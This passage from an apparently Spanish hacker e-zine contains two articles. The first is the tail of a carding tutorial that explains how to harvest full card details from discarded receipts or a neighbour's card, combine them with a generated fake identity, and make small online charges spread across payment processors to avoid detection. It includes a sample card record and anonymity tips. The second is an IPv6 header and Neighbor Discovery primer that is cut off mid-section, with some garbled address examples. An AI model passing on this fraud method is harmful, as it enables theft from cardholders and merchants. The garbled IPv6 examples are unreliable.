estas empresas tienen más dispositivos de seguridad (imaginaros que les da la  
vena y miran los intentos fallidos y veen que cada día un melón se dedica 20  
veces al día a probar tarjetas válidas generadas con un programa, a la larga  
se puede montar un buen lío. Volvamos al formulario, analizamos la página y  
vemos algo parecido a esto: DISH SSL SYSTEMS. SEX.COM - 3 MONTH MEMBERSHIP y  
debajo varios campos a rellenar que pueden ser parecidos a estos (recordad que  
esto sólo es un ejemplo y que los formularios pueden variar mucho). Los  
marcados con un * son los que acostumbran a ser usados para llevar a cabo la  
transacción y los que tengan # son los que pueden ser usados para  
verificaciones de autenticidad de datos y también para llevar a cabo la  
transacción en algunos casos: 
 
* Name: (nombre? xD) 
 
* Last name o Surname: (apellido, sólo el 1º, en caso que no se especifique que 
se necesita también el 2º) 
 
# Billing Address: (dirección del titular, es decir, calle, número y piso  
[comprobación cuando se vaya a cobrar la cantidad al banco]) 
 
# Zip: (código postal [comprobación si existe el código postal o corresponde a  
la ciudad que hemos puesto]) 
 
# City: (pueblo o ciudad [comprobación si coincide con la provincia o estado,  
el país y el CP y en los casos de seguridad extrema comprobación de  
correspondencia entre tarjeta y ciudad]) 
 
# State: (estado o provincia [comprobación de coordinación con ciudad, país y  
CP]) 
 
# Country: (país [comprobación de coordinación con ciudad, provincia y CP y en  
los casos de seguridad extrema comprobación de correspondencia entre tarjeta y  
ciudad]) 
 
# E-mail: (aunque lo haya marcado con un #, el e-mail puede ser usado para  
mandarte el password en caso que no lo elijas tu, y también podría ser que  
vendieran tu dirección para que te manden publicidad, pero esto no suele pasar  
cuando los datos los lleva un servidor SSL3 específico [comprobación de  
existencia de la dirección o si es gratis, en caso que no se acepten cuentas de 
este tipo]) 
 
# Phone Number: (número de teléfono [comprobación de prefijo correspondiente a  
ciudad, provincia o país]) 
 
 
Y más abajo está el campo de introducción de datos de la tarjeta, todos estos  
son fundamentales para realizar la transacción: 
 
Name on Card: (nombre y 1er apellido del titular de la tarjeta, debería ser el  
mismo que has puesto arriba) 
 
Card Type: (tipo de tarjeta, usualmente VISA, MasterCard y American Express,  
también hay que aceptan Diners Club y Discovery) 
 
Card number: (número de la tarjeta, usualmente de 16 dígitos, en caso que  
especifique "no spaces or dashes" no se pueden poner espacios o guiones de  
separación entre los bloques de 4 números, por lo que **** **** **** **** y  
****-****-****-**** no valdrían pero si ****************) 
 
Expiry Date: (fecha de caducidad de la tarjeta) 
 
 
Cómo podemos ver, este servidor SSL3 está preparado para evitar tarjetas falsas 
generadas con cualquier de estos programas que tienen el algoritmo de las  
tarjetas, es decir, que si queremos hacernos miembros de la página debemos  
introducir como mínimo una parte de datos verdaderos. Las posibilidades que se 
nos presentan entonces son (cada una con sus convenientes e inconvenientes): 
 
 
1.  Ir a casa del vecino y "pillarle prestada" su VISA, cómo tenemos todos sus  
datos, pues hacer un fraude sería fácil. Lo bueno es que te colará en todos los 
sitios y lo malo es que hay que ser muy cabronazo para hacerle esto a un  
vecino, además corriendo el riesgo que te pille apuntandote sus datos de la  
tarjeta o que sospeche de ti. Además, de seguro tiene poco... 
 
2.  Poner los datos de nuestra tarjeta, es decir, nombre y apellido, número y  
fc pero con una dirección falsa. No aconsejo mucho esta práctica, sobretodo si  
se trata de cantidades grandes, por si acaso se te cobraran o algo (recordar  
que aún quedan servidores con las comprobaciones básicas, es decir, que aún hay 
bancos que con la mínima cantidad de datos se conforman y dan visto a la  
transacción, así que mucho ojo cuando veais alguno de estos). En caso de  
reclamación siempre puedes alegar que te equivocaste al poner algún dato, pero  
de todas formas insisto en que es una práctica que puede resultar eficaz, pero  
no segura, que es lo que queremos. 
 
3.  Ir en busca de comprobantes de reintegros en un cajero automático o  
comprobantes de compra en un supermercado o de pago de una estancia en un  
hotel. Quizá los primeros sean un poco más difíciles de encontrar, ya que la  
mayoría de bancos y cajas de ahorros omiten parte de la información de la  
tarjeta, ya sea no poniendo los 4 primeros o 4 últimos números de la tarjeta o  
no poniendo nombre del titular o fc, eso sí, os aseguro que aún quedan  
comprobantes que enseñan toda la información. En el caso de comprobantes de  
compra o de hotel, es mucho más fácil encontrar que tengan todos los datos. Si 
trabajas en un supermercado, restaurante u hotel te será fácil hacerte con  
alguno que otro. Digamos que esta práctica es la más segura y eficiente de  
todas, y lo mejor es que si actuamos con prudencia y moderación, el usuario de 
la tarjeta no se enterará de lo que estamos haciendo, así que el único  
perjudicado es el site que nos ofrece el producto. Al ser el mejor de los 3  
métodos lo detallaré mucho más y pondré varios ejemplos. Imaginemos que ya  
hemos conseguido un comprobante con todos los datos necesarios. Ahora nos falta 
tener una dirección, código postal, y número de teléfono como mínimo. Aquí es  
cuando los programas nos dan su utilidad. Por ejemplo, cogemos el Credit Wizard 
y generamos los datos de una persona. Así que cogemos la dirección, teléfono,  
etc., etc. y los complementamos con los reales, hasta que quede algo así mas o  
menos:  
 
Tincho Ecs Fempinya 
4490 7850 9807 5970 
09/00 
680 Sandvitx Avenue - 34590 - Miami (FL/Florida) - USA 
375-9087960 
     
Con esto deberíamos tener suficiente para realizar alguna pequeña compra, ya  
sea para bajarse software, cómo para hacerse miembro de sex.com, pero NUNCA  
para cosas que se tengan que mandar por correo, ya que en este caso, antes de  
mandar el producto, se verifica la autenticidad de TODOS los datos y se podría  
descubrir el montaje , ya por no mencionar que ni se te ocurra poner tu  
dirección para que te lo manden. De todas formas tampoco aconsejo hacerlo con  
ninguno de los otros dos métodos. 
     
A continuación una série de consejos para que la cosa resulte más segura: 
 
· Usar la tarjeta sólo cuando sea necesario o para comprobar su efectividad. 
 
· Hacer las compras mínimas y con servidores distintos, para que no se le dé  
  importancia (un servidor SSL no se mata a buscar quien ha estafado 10$ por  
  hacerse miembro un par de semanillas en sex.com). En el caso que se nos  
  ofrezcan varias opciones de subscripción, escoger una mediana, por ejemplo,  
  si la mediana vale 10$ para un mes y tenemos otra que son 200$ para dos  
  años la cosa puede cambiar. Lo de los servidores distintos también es una  
  buena medida de precaución: si tenemos DISH SSL3 Systems, Instant SSL y  
  Melón Transactions S.A. y gastamos 10$ en cada uno, no es lo mismo que si  
  acumulamos los 30$ en DISH SSL3 Systems, no porque sea una cantidad excesiva  
  sino por los repetidos abusos. 
 
· No subestimar los sistemas de logeo de Ips. 
 
· Usar una cuenta que no sea la tuya o que no esté personalizada (Alehop,  
  Jazzfree, etc.). 
 
· Usar la tarjeta desde un ciber o usando una shell con Lynx SSL. 
 
Aquí acaba este artículo, espero que haya sido de vuestro agrado y que lo uséis 
con razonamiento. Hasta la próxima! 
 
 
Saludos a: clerks, Chui, DarK FeaR, H4XW4r3Z (xD), Lupin_III,MoebiuZ,  Sp4rK,
Ripe, [^RaiSe^],  {{ScsiX}}, Tincho (x'D) y todos aquellos que se me olviden.
 
 
GamerX / fem-ne@earthalliance.com


=[01000b]=====================================================================
=[IPv6, el futuro de Internet]================================================
=[por p0th]===================================================================


                          | IPv6, el futuro de Internet | 
 
 
0 Introduccion 
 
1 Nomenclatura IPv6. 
	1.1   Nomenclatura. 
 
2 Cabeceras IPv6 
	2.1   Cabecera Estandar. 
	2.2   Extensiones de Cabecera. 
 
3 Deteccion de problemas y mantenimiento bajo IPv6 
	3.1   Mantenimiento 
	3.2   Neighbor Discovery. 
	3.2.1 Formatos para Neighbor Discovery. 
	3.2.2 Formato del campo de opciones del ND. 
 
4 ICMPv6 
	4.1 Tipos de ICMPv6 
	4.2 Tipos de ICMPv6 de informacion y sus formatos 
	4.3 Tipos de ICMPv6 de error y sus formatos 
	4.4 Seguridad e ICMPv6 
 
5 Links, bibliografia, etc... 
	5.1   Links. 
	5.2   Bibliografia. 
	5.3   Agradecimientos y comentarios finales. 
 
 
 
 
0 Introduccion 
 
Para todos vosotros, supongo que sera conocida la actual implementacion de 
protocolo IP, es decir la version 4 del Internet Protocol, por lo que 
intentare no 'abusar' de las comparativas, para no aburrir demasiado. 
Tambien intentare, en lo posible, respetar los terminos adecuados, 
traduciendolos entre parentesis la primera vez que sean referenciados. No 
obstante, las traducciones literales de ciertos terminos, conducirian a 
la confusion mas absoluta, lejos de lograr un mejor entendimiento del 
concepto, por lo que conceptos como router (enrutador), enlace (link) y 
socket (conector) seran directamente tratados en el idioma 
anglosajon. Asi mismo, sinonimos como datagrama y paquete; pasarela, 
gateway, router se usara el mas actual o mas usado, como en este ultimo 
ejemplo, router. Para cualquier duda o reporte de errores en el presente 
documento, enviadme un mail a la direccion que especifico en la parte 
final del mismo. 
 
				|-------------------------------| 
 
1_ Nomenclatura IPv6. 
 
 Cuando se desarrollo la actual notacion basada en direcciones de 32 Bits, 
agrupados en 4 campos de 8 bits, el numero de hosts maximos que por aquel 
entonces se podian direccionar resultaba muy lejano de las expectativas 
que por aquel entonces se tenian de la red Internet. 
Actualmente, aunque se ha visto frenada debido al uso de CIDR, el continuo 
y tambien desorbitado crecimiento esta a punto de desbordar la capacidad 
de IPv4. Gracias a las nuevas implementaciones de IPv6, no nos tendremos 
que preocupar de este problema durante muuuuchos años. 
 
1.1  Nomenclatura 
 
El nuevo formato, usa una direccion de 128 bits, repartidas en 
8 campos de 16 bits de la siguiente manera: 
 
23CF:0000:0000:0000:19FC:A96C:B456:FFFF 
 
Tambien se especifica la posibilidad de 'comprimir' campos cuyo valor sea 
0, con lo que si un campo es ...:0000:... se puede usar ...:0:... en su 
lugar. 
Asi mismo, si algunos campos vecinos, tienen de valor 0 tambien se pueden 
comprimir tal y como se explica a continuacion, basandose en la direccion 
de antes: 
 
23CF::FFFF:19FC:A96C:B456:FFFF 
 
Donde se ha cambiado la cadena :0000:0000: por solo :: aunque no se pueden 
comprimir a la vez, 2 grupos colocados en lugares no contiguos. Por 
ejemplo en la direccion FFFF:0:0:0:FFFF:0:0:0, se podria 
comprimir en FFFF::FFFF:0:0:0 o en FFFF:0:0:0:FFFF::, pero nunca en 
FFFF::FFFF:: por que no se podria distinguir cual de los campos se usa de 
relleno. Explicado en otras palabras, cuando un campo vale ::, se rellena 
con 0 hasta completar la direccion. 
 
Como es logico, las direcciones reservadas como loopback, de broadcast y 
usadas en intranets, se han visto modificadas, aunque, como ya veremos, 
estas ultimas no necesitaran de ser actualizadas si no es preciso. 
 
   Direcciones especiales: 
			  		IPv4		IPv6		 
 
	Loopback ---    	      127.0.0.1    0:0:0:0:0:0:0:1	|| ::1 
	Unspecified Adresss ---	        0.0.0.0	   0:0:0:0:0:0:0:0	|| :: 
 
 
 Tambien se ha pensado en las redes que comparten las dos versiones de IP, 
y se accedera a ellas del siguiente modo: 
 
 
    |                80 bits               | 16 |      32 bits        | 
    +--------------------------------------+--------------------------+ 
    |0000..............................0000|0000|    IPv4 address     | 
    +--------------------------------------+----+---------------------+ 
 
 
Para conectarse a la maquina Host1 desde Host2, se debe especificar la 
direccion IP en el formato de la V6, de la siguiente manera 
0:0:0:0:0:FFFF:192.168.1.2 y Host2 es visto desde Host1 como 192.168.1.3 
 
Si son varias redes las que hay en juego, se procede a practicar el 
tunneling entre versiones por parte de los nodos. 
 
 _____________		  ______________________	 _______________ 
|Red con IPv6 |		 |Nodo  	        |	|Red con IPv4   | 
| 	      |==========|0:0:0:0:0:192.168.1.1 |=======|	        | 
|Zona A	      |		 |______________________|	|Zona B         | 
|_____________|		            			|_______________| 
 _____________		 ______________________ 		| 
|Red con IPv6 |  	|Nodo   	       |		| 
|	      |=========|0:0:0:0:0:192.168.2.1 |================+ 
|Zona C	      |		|______________________| 
|_____________| 
 
Asi de esta forma, se pueden comunicar sin problemas, la Zona A con la 
Zona C, sin necesidad de actualizar la Zona B y de una forma elegante y 
transparente para los usuarios. 
 
Para identificar a un host, perteneciente a nuestra subred, en la IPv4, se 
hacia mediante la comparacion de nuestra direccion con la mascara de red. 
Esto supuso una manera comoda de trabajar, aunque propicio el despilfarro 
de muchisimas direcciones IP, hasta que fue frenado de manera considerable 
por el uso de CIDR. 
Como es logico, IPv6 realiza esta tarea de una manera mas eficiente mediante 
Identificadores. El uso de estos identificadores facilitara tanto la asigna- 
cion, como la identificacion de una red, independientemente de su tamaño. 
En el ejemplo que se recoge en el RFC 1884, se puede observar el mecanismo 
empleado para ello: 
 
 
    |              n bits            | 80-n bits |     48 bits        | 
    +--------------------------------+-----------+--------------------+ 
    |        subscriber prefix       | subnet ID |   interface ID     | 
    +--------------------------------+-----------+--------------------+ 
 
En este ejemplo, se puede observar la zona de 80 bits para el identificador de 
subred y los 48 bits finales, que son asignados mediante la direccion hardware 
del interfaz de red, en este caso, una tarjeta de red que cumple el estandar 
IEEE-802. 
Esto a su vez, permitiria una manera muy facil de asignar direcciones IP sin 
mayor complicacion que la asignacion de el ID de subred comun, por lo que el 
administrador, no se tendria que preocupar de asignar las direcciones ultimas 
de host. 
En este mismo RFC, se describen otros metodos, pero no es mi intencion 
profundizar demasiado, o que este documento sea una traduccion literal del 
mismo, por lo que recomiendo su atenta lectura. 
 
				|-------------------------------| 
 
2  Cabeceras IPv6 
 
2.1 Cabecera Estandar 
 
Tambien, como es logico, el formato del cabecera de IP, se ha visto alterado, 
y  se han añadido muchas e interesantes opciones, algunas ya presentes en 
IPv4, y se ha procedido a la eliminacion de las no usadas o deficientemente 
implementadas. 
 
   Segun esto, una cabecera IPv6 quedaria dividida en los siguientes campos: 
	 
	Version (4 bits) : 
		Identifica la version, y logicamente, tiene el valor 6 
 
	Traffic Class (8 bits): 
		Esto renueva y amplia en anterior concepto de TOS (Type of 
		service). Los valores de este campo, no se encuentran 
		estandarizados por el momento, por lo que su valor inicial, 
		deberia ser 00000000 por el momento. 
 
 
 
	Flow Label (20 bits): 
		En este campo, se pueden comunicar diferentes valores, para el 
		manejo del paquete para su enrrutamiento, reserva de ancho de  
		banda, que mejorara la recepcion de video y sonido sobre IP, 
		a parte de descargar al router de parte del trabajo en lo que 
		a administracion de calidad de servicio se refiere.	 
		Para mas informacion sobre este valor, recomiendo la 
	 	lectura del Apendice A en el RFC 2460. 
 
 
 
	Payload Length (16 bits como unsigned integer): 
		Expresa la longitud de la carga del paquete en bytes (octetos) 
 
 
	Next Header (8 bits): 
		Comunica el tipo de cabecera siguiente a la de IPv6. Como por 
		ejemplo, 6 para TCP. Los valores son los mismos que usa IPv4 
		aunque en la anterior especificacion, este campo tomaba el 
		nombre de 'Protocol', y se recogen en el RFC 1700. 
 
 
	Hop Limit (8 bits como unsigned integer): 
		Este campo sustituye al TTL de IPv4, y tiene un valor inicial 
		determinado por el host emisor en un rango de 0 a 255. Cuando 
		un paquete llega a un router, a este valor se le resta 1 y si 
		este llega a 0, es descartado por el mismo. 
 
	Source Address (128 bits): 
		Direccion de origen del paquete. 
 
	Destination Address (128 bits): 
		Direccion de destino, aunque como se explica en la seccion, se 
		puede añadir la ruta por la cual se debe encaminar el paquete. 
 
2.2 Extensiones de cabecera 
  
   Como novedad, se implementa el concepto extensiones de cabeceras. Estas, son 
como 'añadidos' a la cabecera estandar, lo que hace mas modulables y 
extensibles las posibilidades de IPv6. 
Estan extensiones, se identifican mediante el campo 'Next Header'. Los nuevos 
identificativos son: 
 
 Hop-by-Hop Options (Valor de next header de la cabecera anterior 0) 
 Routing (Valor de next header de la cabecera anterior 43) 
 Fragment (Valor de next header de la cabecera anterior 44) 
 Destination Options (Valor de next header de la cabecera anterior  ) 
 Authentication (Valor en el campo next header de la cabecera anterior 51) 
 Encapsulating Security Payload (Valor de next header de la cabecera anterior50) 
 Last header (Valor en el campo next header de la cabecera anterior 59) 
 Destination Options (Valor en el campo next header de la cabecera anterior 60) 
 
En el RFC 2460, se pone como ejemplo los siguientes: 
 
   +---------------+------------------------ 
   |  IPv6 header  | TCP header + data 
   |               | 
   | Next Header = | 
   |      TCP      | 
   +---------------+------------------------ 
 
 
   +---------------+----------------+------------------------ 
   |  IPv6 header  | Routing header | TCP header + data 
   |               |                | 
   | Next Header = |  Next Header = | 
   |    Routing    |      TCP       | 
   +---------------+----------------+------------------------ 
 
   +---------------+----------------+-----------------+----------------- 
   |  IPv6 header  | Routing header | Fragment header | fragment of TCP 
   |               |                |                 |  header + data 
   | Next Header = |  Next Header = |  Next Header =  | 
   |    Routing    |    Fragment    |       TCP       | 
   +---------------+----------------+-----------------+----------------- 
 
 Que pueden ayudar a comprender el importate alcance de incluir esta capa 
dentro de un datagrama. Cabe destacar, que una version propietaria, puede 
incluir sus propias extensiones. Logicamente, se tienen que cumplir las 
minimas  requeridas por el RFC 2460, que son las siguientes que se comentan 
brevemente a continuacion: 
 
>	Hop-by-Hop Options: 
		Son opciones, cuyo valor debe ser revisado por todos los nodos 
 por los que el paquete es encaminado. 
	Tiene el siguiente formato: 
 
	+--------------+----------------+------------------+ 
	|Next header   | Hdr Ext Len	| Options	   | 
	+--------------+----------------+------------------+ 
 
 En el campo Next Header se expecifica el tipo de cabecera inmediatamente 
siguiente a esta, indicandolo mediante un selector de 8 bits. 
 En el campo Hdr Ext Len ( Header Extended Lenght) se especifica la longitud 
del campo options, exceptuando los primeros 8 bytes. Se indica como 
un valor de 8 bits unsigned integer. 
 En el campo Options, se incluyen las opciones que se especifican en el 
apartado 4.2 del RFC 2460. Su longitud es variable aunque la suma de la 
longitud de la cabecera Hop-by-Hop, debe ser multiplo de 8 bytes. 
 
>	Routing: 
	Esta cabecera, posibilita una de las funciones mas taractivas de la 
version 6 de IP. Su funcion, es la de poder especificar el camino exacto que 
preferentemente debe recorrer un paquete hasta llegar a su destino. 
	El formato es el siguiente: 
 
	+---------------+---------------+---------------+---------------+ 
	|  Next Header  |  Hdr Ext Len  |  Routing Type | Segments Left | 
	+---------------+---------------+---------------+---------------+ 
 
 En el campo Next Header se expecifica el tipo de cabecera inmediatamente 
siguiente a esta, indicandolo mediante un selector de 8 bits. 
 En el campo Hdr Ext Len ( Header Extended Lenght) se especifica la longitud 
de la cabecera routing, exceptuando los primeros 8 bytes. Se indica como 
un valor de 8 bits unsigned integer. 
 El campo Routing Type es un selector de 8 bits de tamaño, que indica el tipo 
de cabecera 'routing' que de momento es 0. Este tipo de cabeceras de 
enrrutado, tiene el siguiente formato: 
 
	+---------------+---------------+-----------------+---------------+ 
	|  Next Header  |  Hdr Ext Len  | Routing Type = 0| Segments Left | 
	+---------------+---------------+-----------------+---------------+ 
	|			      (Reservado)			  | 
	+-----------------------------------------------------------------+ 
	|			      Direccion 1			  | 
	+-----------------------------------------------------------------+ 
	|			      Direccion 2			  | 
	+-----------------------------------------------------------------+ 
	|			      Direccion x			  | 
	+-----------------------------------------------------------------+ 
	En este tipo de cabecera de enrrutado, se especifican en el campo de 
direcciones la IP por la que el paquete debe pasar para llegar a su destino. 
Cuando un paquete llega a 'Direccion 1' esta, coloca si propia direccion en el 
ultimo lugar y envia el paquete a la 'Direccion 2' que hace el mismo 
procedimiento y se decrementa en 1 el campo Segments Left. Cuando se llega al 
destino final. El paquete conserva la ruta completa por la que ha pasado y es 
utilizada para enviar el retorno. Para obtener informacion mas extensa, asi 
como un algorritmo de manejo de esta clase de cabeceras, te remito al RFC 2460. 
 
 
 El campo Segments Left de la cabecera de routing, se indica el 
numero se segmentos de red, que quedan para que el paquete llege a su destino.  
En cada salto, este numero se decrementa en 1. Su valor se comunica mediante 
un unsigned integer. 
 
 
 
 
>	Fragment: 
	Al contrario de la IPv4, la fragmentacion unicamente debe ser 
efectuada en el host de origen. Si el router se encontrara con un paquete de 
un tamaño mayor al que puede manejar el siguiente salto, debe descartarlo y 
enviar al host de origen un ICMP que comunique la MTU del siguiente salto. 
	El formato de esta clase de cabeceras es el siguiente: 
 
	+---------------+---------------+-------------------------+---+-+ 
	|  Next Header  |   Reserved    |      Fragment Offset    |Res|M| 
	+---------------+---------------+-------------------------+---+-+ 
	|                         Identification                        | 
	+---------------------------------------------------------------+ 
 
 En el campo Next Header se expecifica el tipo de cabecera inmediatamente 
siguiente a esta, indicandolo mediante un selector de 8 bits. 
 El campo Reserved esta reservado para usos futuros y debe ser inicializado a 
0 en el origen e ignorado en la recepcion. El valor debe ser de 8 bytes del 
tipo unsigned integer. 
 El campo Fragment Offset es de una longitud de 13 bits, e indica 
desplazamientos, en bloques de 8 bytes relativos al primer paquete de la serie. 
 El campo Res, esta reservado para usos futuros y debe ser inicializado en 
origen a 0 e ignorado por el destino. 
 La flag M, inica mediante un bit, si el paquete es el ultimo (valor 0) o por 
el contrario es uno mas de la serie (valor 1) 
 
 
 
>	Destination Options 
		Esta cabecera, indica las opciones que deben procesarse en el 
destino o en los destinos en el caso de multienvios.Si va acompañada por 
cabeceras de enrutamiento, la cabecera de opciones de destino colocada antes 
de la de enrrutamiento, se aplica a todos los nodos, mientras que la que se 
encuantra al final, es solo aplicable a la direccion de destino. Su formato es 
el siguiente: 
 
 
	+--------------+----------------+------------------+ 
	|Next header   | Hdr Ext Len	| Options	   | 
	+--------------+----------------+------------------+ 
 
 En el campo Next Header se expecifica el tipo de cabecera inmediatamente 
siguiente a esta, indicandolo mediante un selector de 8 bits. 
 En el campo Hdr Ext Len ( Header Extended Lenght) se especifica la longitud 
de la cabecera Destination Options, exceptuando los primeros 8 bytes. Se indica como 
un valor de 8 bits unsigned integer. 
 El campo options, de longitud variable, no se han especificado mas opciones 
que las de relleno hasta que el tamaño sea multiplo de 8 bytes. 
 
 
 
>	Authentication: 
	Debida la extension de esta especificacion y el estado de desarrollo, 
	Ver RFC 2402 
 
>	Encapsulating Security Payload: 
	Debida la extension de esta especificacion y el estado de desarrollo, 
	Ver RFC 2406 
 
 
Todas ellas, deben seguir un orden dentro del datagrama: 
 
 IPv6 header  
 Hop-by-Hop Options header   
 Destination Options header   
 Routing header  
 Fragment header  
 Authentication header 
 Encapsulating Security Payload header 
 Destination Options header 
 Upper-layer header 
 
				|-------------------------------| 
 
3 Deteccion de problemas y mantenimiento bajo IPv6 
 
3.1 Mantenimiento 
 Con la nueva version de IP, a parte de la eliminacion de mascaras de red, y 
limitaciones en el numero de direcciones disponibles, los desarrolladores del 
Internet Protocol han decidido facilitarle mucho la vida a los administradores. 
Una red que corra sobre IPv6, sera una red facil de administrar, con menos 
carga en los routers y con muchos problemas menos de trafico que la 'antigua' 
IPv4. 
Esto no quiere decir que una red sobre IPv6, sea el paraiso, por que el 
trabajo de administrador siempre sera el de administrar, hoy estoy muy 
inspirado :), y las cosas que se han de administrar, suelen tener tendencia a 
desadministrarse, bonito trabalenguas. 
 
Para el montage de una red sobre IPv6, se han desarrollado nuevos protocolos, 
y se han extendido muchos de los existentes. En el RFC 2452, se da una clara 
exposicion de los cambios dentro del MIB, extendiendose en el 2454 y en el 
RFC 2465. Parece ser que el snmp va a pasar un periodo de nueva juventud, y un 
uso mas extendido por parte de los administradores. 
Soluciones mas completas como la del DHCPv6, explicada en el RFC 2462, 
permiten que un host, no solo obtenga una IP con la seguridad de que es unica 
en su red, si no que sea tambien dado de alta en el servidor de DNS, 
solicitando un nombre directamente al servidor DHCPv6. 
 
Tampoco el ARP se salva de la quema, y sus funciones son mucho mejor cubiertas 
por nuevos procedimientos explicados en este mismo documento, en la seccion 3.2 
Problemas como los traslados de equipos a otras redes y/o la reconfiguracion 
de la misma para ampliarla, seran historia en la nueva version IP. 
 
 
3.2 Neighbor Discovery 
 
El Neighbor Discovery protocol (protocolo de descubrimiento de vecindad), es 
el encargado de saber por que hosts/redes estamos rodeados. Esto, tambien 
incluye descubrir las caracteristicas del medio por donde van a circular los 
paquetes que salgan de nuestra maquina. El Neighbor Discovery hace uso de 
ICMPv6, para comunicarse, tal y como se especificara en el siguiente capitulo. 
Tal y como se comenta en el RFC 2461, el Neighbor Discovery, es una 
combinacion de ARP, ICMP Router Discovery e ICMP redirect, y a su vez se han 
incorporado nuevas funciones. Entre las funciones de este protocolo, estan 
las de: 
 
 Router Discovery (Descubrimiento de router): Comunica al host y a otros 
routers, la existencia de un nuevo router, o la permanencia / eliminacion de 
los actuales. 
 
 Parameter Discovery (Descubrimiento de parametros): Da informacion a los nodos 
de una red, sobre el MTU, asi como del numero maximo de saltos para llegar al 
exterior. 
 
 Prefix Discovery (Descubrimiento de prefijo): Comunica al nodo el prefijo de 
la red, que tiene la direccion IPv6 de su subred. 
 
 Next-hop determination (Determinacion del proximo salto): Comunica el nodo 
mas cercano. Este valor puede ser usado para determinar la ruta mas corta por 
la cual se encaminaran los paquetes. 
 
 Address Autoconfiguration (Autoconfiguracion de direccion): Da a conocer a 
la maquina, la IP de un interfaz de red. 
 
 Address resolution (Resolucion de direccion): Haciendo un poco de humor, se 
le puede llamar 'El artista antes conocido como ARP' ;). Se encarga de 
establecer la corespondencia entre la direccion IP y la de su capa de enlace 
(Direccion MAC de una ethernet por ejemplo). 
 
 Neighbor Unreachability Detection (Deteccion de inalcanzabilidad de un 
vecino): Detecta la caida, o eliminacion de un router y/o host. 
 
 Duplicate Address Detection (Deteccion de Duplicidad de direcciones): 
Comprueba que no hay direcciones IP duplicadas dentro de una red. Puede ser 
usado antes de dar de alta un nuevo nodo. 
 
 Redirect (Redireccion): Informa a un nodo, de el mejor camino mas corto, para 
alcanzar un destino. 
 
 
 
3.2.1 Formatos para Neighbor Discovery. 
 
Los formatos para los mensages, quedan definidos de la siguiente manera. 
 
 Router Solicitation: 
 
	+---------------+---------------+-------------------------------+ 
	|     Type      |     Code      |          Checksum             | 
	+---------------+---------------+-------------------------------+ 
	|                            Reserved                           | 
	+---------------------------------------------------------------+ 
	|   Options ...							| 
	+---------------------------------------------------------------+ 
 
Los valores para estos campos, son los siguientes: 
 Type: 133 
 Code: 0 
 Checksum: (Suma de control ICMPv6) 
 Reserved: 0 (Sin un valor asignado) 
 Options:  
- Source link-layer address 
Direccion de la capa de enlace del origen del mensage. 
 
 
 
 
 
 Router Advertisement: 
 
	+---------------+---------------+-------------------------------+ 
	|     Type      |     Code      |          Checksum             | 
	+---------------+---------------+-------------------------------+ 
	| Cur Hop Limit |M|O|  Reserved |       Router Lifetime         | 
	+---------------+-+-+-----------+-------------------------------+ 
	|                         Reachable Time                        | 
	+---------------------------------------------------------------+ 
	|                          Retrans Timer                        | 
	+---------------------------------------------------------------+ 
	|   Options ...							| 
	+---------------------------------------------------------------+ 
 
 Los valores para estos campos, son los siguientes: 
 Type: 134 
 Code: 0 
 Checksum: (Suma de control ICMPv6) 
 Cur Hop Limit: Valor actual que debe tomar el campo de IP que indica el 
numero de saltos por defecto, o Hop Limit, especificado en 8 bytes unsigned 
integer. Un valor de 0, no especifica nada. 
 M: Flag de 1 bit, para el Managed address configuration.  
 O: Flag de 1 bit, para el Other stateful configuration. 
 Reserved: Campo reservado para usos futuros. Con valor de 6 bit, debe ser 
inicializado a 0. Cualquier otro valor, sera ignorado. 
 Router Lifetime: Valor de 16 bits unsigned integer. El tiempo de vida del 
router por defecto. Si el valor es 0, no debe ser usado para este fin. 
 Reachable Time: Tiempo medido en 32 bits unsigned integer, que indica, en 
milisegundos, el tiempo desde que un nodo, ha recibido una confirmacion de 
alcance, por parte de sus vecinos. Un valor de 0, no especifica nada. 
 Retrans Timer: Tiempo en milisegundos, expresados como unsigned integer, 
trascurrido entre 2 mensajes de solucitud de vecindad. Un valor de 0, 
inhabilita este campo. 
 Options: 
- Source link-layer address 
Direccion de la capa de enlace del origen del mensage. 
-MTU 
Debe ser enviada en redes con la MTU variable. En otra clase de enlaces, 
esta opcion es opcional. 
-Prefix Information 
Los prefijos de las redes que alcanza el router excepto la local. 
 
 
 
 
 Neighbor Solicitation 
 
 
	+---------------------------------------------------------------+ 
	|      Type      |     Code      |          Checksum		| 
	+---------------------------------------------------------------+ 
	|			Reserved 				| 
	+---------------------------------------------------------------+ 
	|			Target Address				| 
	+---------------------------------------------------------------+ 
	|  Options ...							| 
	+---------------------------------------------------------------+ 
 
Los valores para estos campos, son los siguientes: 
 Type: 135 
 Code: 0 
 Checksum: (Suma de control ICMPv6) 
 Reserved: 0 (Sin un valor asignado) 
 Target address: Direccion IP hacia la cual se envia la solucitud. Este campo 
no debe ser ocupado por una direccion de multicast. 
 Options: 
- Source link-layer address 
Direccion de la capa de enlace del origen del mensage. 
No debe incluirse si es una direccion de arranque. En cambio si ya tiene IP, 
puede ser incluida si es una solicitud de multicast y debe ser incluida si es 
una solicitud de anycast. 
 
 Neighbor Advertisement 
 
 
	+---------------------------------------------------------------+ 
	|      Type      |     Code      |          Checksum		| 
	+---------------------------------------------------------------+ 
	|R|S|O| 		Reserved 				| 
	+---------------------------------------------------------------+ 
	|			Target Address				| 
	+---------------------------------------------------------------+ 
	|  Options ...							| 
	+---------------------------------------------------------------+ 
 
Los valores para estos campos, son los siguientes: 
 
 Type: 136 
 Code: 0 
 Checksum: (Suma de control ICMPv6) 
 R: Router flag de un bit. Indica que el nodo de envio es un router. Es usado 
por el Neighbor Unreachability Detection, para ver si un router cambia a host. 
 S: Solicited flag de un bit. Toma valor 1, si el mensage es en respuesta a 
una solicitud de vecindad. 
 O: Override flag. Con valor 1, indica que la cache de destino debe ser 
actualizada. Si el valor es 0, la cache de destino no debe ser actualizada 
menos para los nodos implicados. 
 Reserved: 29 bits sin uso, destinados a furusar implementaciones. debe ser 
inicializado a 0. Otro valor, sera ignorado. 
 Target Address: Direccion de destino, que debe ser la del nodo que solocito 
este mensage. No debe ser ninguna direccion de multicast. 
 Options: 
- Target link-layer address 
Direccion de la capa de enlace del destino. Puede ser incluida respondiendo a 
una solicitud de multicast y debe ser incluida si es una respuesta a 
una solicitud de anycast. 
 
 
 
 
 Redirect 
 
	+---------------------------------------------------------------+ 
	|      Type      |     Code      |          Checksum		| 
	+---------------------------------------------------------------+ 
	|			Reserved 				| 
	+---------------------------------------------------------------+ 
	|			Target Address				| 
	+---------------------------------------------------------------+ 
	|			Destination Address			| 
	+---------------------------------------------------------------+ 
	|  Options ...							| 
	+---------------------------------------------------------------+ 
 
Los valores para estos campos, son los siguientes: 
 
 Type: 137 
 Code: 0 
